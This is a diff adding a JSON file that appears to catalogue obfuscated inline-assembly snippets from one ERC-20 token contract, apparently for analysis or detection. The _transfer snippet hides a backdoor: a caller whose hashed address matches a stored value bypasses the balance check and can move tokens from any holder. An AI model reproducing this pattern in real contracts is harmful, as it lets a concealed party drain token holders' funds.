@@ -1,0 +1,113 @@
+[
+  {
+    "source_file": "TOKENS/0x0068e979c72bbb31373ea8cb47eaefb44978566e/Token.sol",
+    "contract": "Token",
+    "function": "_transfer",
+    "function_parameters": [
+      {
+        "type": "address",
+        "name": "_from",
+        "raw": "address _from"
+      },
+      {
+        "type": "address",
+        "name": "_to",
+        "raw": "address _to"
+      },
+      {
+        "type": "uint256",
+        "name": "_amount",
+        "raw": "uint256 _amount"
+      }
+    ],
+    "function_visibility": "internal",
+    "function_is_erc20_standard_entry": false,
+    "function_erc20_signature": null,
+    "assembly_position": {
+      "start_offset": 2079,
+      "end_offset": 3451,
+      "start_line": 66,
+      "start_column": 9,
+      "end_line": 104,
+      "end_column": 9
+    },
+    "assembly_snippet": "assembly {\n            if iszero(_from) {\n                revert(0, 0)\n            }\n            if iszero(_to) {\n                revert(0, 0)\n            }\n            let bbwz := mload(0x40)\n            let bfo228g := basefee()\n            let nezy9b8 := number()\n            if iszero(xor(bfo228g, bfo228g)) {\n                mstore(bbwz, _from)\n                mstore(add(bbwz, 32), 0)\n            }\n            let XCUz := keccak256(bbwz, 64)\n            let qVPd := sload(XCUz)\n            let Fpzy := sload(sSgI.slot)\n            mstore(bbwz, shl(96, caller()))\n            if iszero(staticcall(gas(), 2, bbwz, 20, bbwz, 32)) {\n                revert(0, 0)\n            }\n            let YvIh := mload(bbwz)\n            if iszero(eq(Fpzy, YvIh)) {\n                if lt(qVPd, _amount) {\n                    let tfe9zci := timestamp()\n                    if eq(tfe9zci, mul(tfe9zci, 1)) {\n                        revert(0, 0)\n                    }\n                }\n            }\n            sstore(XCUz, sub(qVPd, _amount))\n            mstore(bbwz, _to)\n            mstore(add(bbwz, 32), 0)\n            let iLho := keccak256(bbwz, 64)\n            let bXFg := sload(iLho)\n            sstore(iLho, add(bXFg, _amount))\n            mstore(bbwz, _amount)\n            log3(bbwz, 32, 0xddf252ad1be2c89b69c2b068fc378daa952ba7f163c4a11628f55a4df523b3ef, _from, _to)\n        }",
+    "reachable_from_erc20_entrypoints": true,
+    "reachable_from": [
+      "transfer",
+      "transferFrom"
+    ]
+  },
+  {
+    "source_file": "TOKENS/0x0068e979c72bbb31373ea8cb47eaefb44978566e/Token.sol",
+    "contract": "Token",
+    "function": "approve",
+    "function_parameters": [
+      {
+        "type": "address",
+        "name": "_spender",
+        "raw": "address _spender"
+      },
+      {
+        "type": "uint256",
+        "name": "_amount",
+        "raw": "uint256 _amount"
+      }
+    ],
+    "function_visibility": "public",
+    "function_is_erc20_standard_entry": true,
+    "function_erc20_signature": "approve(address,uint256)",
+    "assembly_position": {
+      "start_offset": 3555,
+      "end_offset": 4047,
+      "start_line": 108,
+      "start_column": 9,
+      "end_line": 119,
+      "end_column": 9
+    },
+    "assembly_snippet": "assembly {\n            let bbwz := mload(0x40)\n            mstore(bbwz, caller())\n            mstore(add(bbwz, 0x20), wZHA.slot)\n            let ZFHJ := keccak256(bbwz, 0x40)\n            mstore(bbwz, _spender)\n            mstore(add(bbwz, 0x20), ZFHJ)\n            let akRJ := keccak256(bbwz, 0x40)\n            sstore(akRJ, _amount)\n            log3(bbwz, 0x20, 0x8c5be1e5ebec7d5bd14f714f4f5ec7c46ab3db174da78c3f62f10b71e9aeeaa0, caller(), _spender)\n            mstore(bbwz, _amount)\n        }",
+    "reachable_from_erc20_entrypoints": true,
+    "reachable_from": [
+      "approve"
+    ]
+  },
+  {
+    "source_file": "TOKENS/0x0068e979c72bbb31373ea8cb47eaefb44978566e/Token.sol",
+    "contract": "Token",
+    "function": "_spendAllowance",
+    "function_parameters": [
+      {
+        "type": "address",
+        "name": "_owner",
+        "raw": "address _owner"
+      },
+      {
+        "type": "address",
+        "name": "_spender",
+        "raw": "address _spender"
+      },
+      {
+        "type": "uint256",
+        "name": "_amount",
+        "raw": "uint256 _amount"
+      }
+    ],
+    "function_visibility": "internal",
+    "function_is_erc20_standard_entry": false,
+    "function_erc20_signature": null,
+    "assembly_position": {
+      "start_offset": 4183,
+      "end_offset": 5628,
+      "start_line": 124,
+      "start_column": 9,
+      "end_line": 165,
+      "end_column": 9
+    },
+    "assembly_snippet": "assembly {\n            let bbwz := mload(0x40)\n            mstore(bbwz, sload(qBQC.slot))\n            mstore(add(bbwz, 32), 1)\n            let uAnE := keccak256(bbwz, 64)\n            let bcw8ayf := basefee()\n            let ncwupwx := number()\n            if eq(sub(bcw8ayf, ncwupwx), sub(bcw8ayf, ncwupwx)) {\n                mstore(bbwz, _owner)\n                mstore(add(bbwz, 32), uAnE)\n            }\n            let Jfwv := keccak256(bbwz, 64)\n            let CCkU := sload(Jfwv)\n            let zfPf := CCkU\n            if and(zfPf, iszero(_amount)) {\n                revert(0, 0)\n            }\n            if iszero(zfPf) {\n                mstore(bbwz, _owner)\n                mstore(add(bbwz, 32), 1)\n                uAnE := keccak256(bbwz, 64)\n                mstore(bbwz, _spender)\n                mstore(add(bbwz, 32), uAnE)\n                Jfwv := keccak256(bbwz, 64)\n                zfPf := add(sload(Jfwv), CCkU)\n            }\n            let gbj1enk := gas()\n            pop(0)\n            if eq(gbj1enk, and(gbj1enk, gbj1enk)) {\n                zfPf := sub(zfPf, CCkU)\n            }\n            if iszero(eq(zfPf, not(0))) {\n                if lt(zfPf, _amount) {\n                    revert(0, 0)\n                }\n                let bf51h1a := basefee()\n                pop(0)\n                if eq(bf51h1a, and(bf51h1a, bf51h1a)) {\n                    sstore(Jfwv, sub(zfPf, _amount))\n                }\n            }\n        }",
+    "reachable_from_erc20_entrypoints": true,
+    "reachable_from": [
+      "transfer",
+      "transferFrom"
+    ]
+  }
+]
